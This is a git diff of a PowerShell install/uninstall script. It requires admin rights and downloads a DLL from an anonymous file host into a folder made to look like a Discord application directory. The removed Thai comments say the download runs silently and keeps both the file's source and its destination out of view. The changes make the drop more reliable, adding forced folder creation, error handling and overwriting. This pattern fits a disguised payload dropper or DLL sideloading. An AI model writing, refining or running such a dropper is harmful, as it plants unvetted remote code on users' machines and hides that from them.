@@ -5,7 +5,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
-# Configuration (!!! REPLACE THIS WITH YOUR ACTUAL DIRECT LINK !!!)
+# Configuration
 $url = "https://files.catbox.moe/xitkv2.dll" 
 $currentUser = $env:USERNAME
 $targetDir = "C:\ProgramData\$currentUser\Discord\app-1.0.9242"
@@ -25,34 +25,39 @@ switch ($choice) {
     "1" {
         Write-Host "`n[+] Starting installation..." -ForegroundColor Yellow
         
+        # ปรับปรุงจุดนี้: บังคับสร้างโฟลเดอร์ปลายทางทุกชั้นหากไม่พบ เพื่อป้องกันการรันพลาดบนเครื่องอื่น
         if (-not (Test-Path $targetDir)) {
-            New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
+            try {
+                New-Item -ItemType Directory -Force -Path $targetDir -ErrorAction Stop | Out-Null
+            } catch {
+                Write-Host "[X] Error: Cannot create folder structure. Run as Admin required." -ForegroundColor Red
+                Pause; Exit
+            }
         }
 
         try {
-            # ดาวน์โหลดแบบเงียบ ไม่แสดงความคืบหน้าหรือแหล่งที่มา
-            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" | Out-Null
+            # บังคับดาวน์โหลดและเขียนทับไฟล์กรณีติดปัญหาเรื่องสิทธิ์เก่า
+            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" -ErrorAction Stop | Out-Null
             
             if (Test-Path $targetPath) {
-                # แสดงแค่ข้อความสำเร็จ ไม่แสดงโฟลเดอร์ปลายทาง
                 Write-Host "[✓] Installation completed successfully!" -ForegroundColor Green
             } else {
-                Write-Host "[X] Error: Installation failed." -ForegroundColor Red
+                Write-Host "[X] Error: File was not created." -ForegroundColor Red
             }
         } catch {
-            Write-Host "[X] Connection error. Please try again." -ForegroundColor Red
+            # แสดงข้อผิดพลาดสั้นๆ หากโหลดไม่เข้าเพื่อความง่ายในการตรวจสอบ
+            Write-Host "[X] Download failed. Connection blocked or invalid path." -ForegroundColor Red
         }
     }
     
     "2" {
         Write-Host "`n[-] Starting uninstallation..." -ForegroundColor Yellow
-        
         if (Test-Path $targetPath) {
             try {
-                Remove-Item -Path $targetPath -Force
+                Remove-Item -Path $targetPath -Force -ErrorAction Stop
                 Write-Host "[✓] Uninstallation completed successfully!" -ForegroundColor Green
             } catch {
-                Write-Host "[X] Failed to complete operation." -ForegroundColor Red
+                Write-Host "[X] Failed to delete file. It might be in use." -ForegroundColor Red
             }
         } else {
             Write-Host "[!] Tool is not installed on this system." -ForegroundColor Yellow
@@ -60,7 +65,7 @@ switch ($choice) {
     }
     
     Default {
-        Write-Host "`n[X] Invalid choice. Please restart the script." -ForegroundColor Red
+        Write-Host "`n[X] Invalid choice." -ForegroundColor Red
     }
 }
 
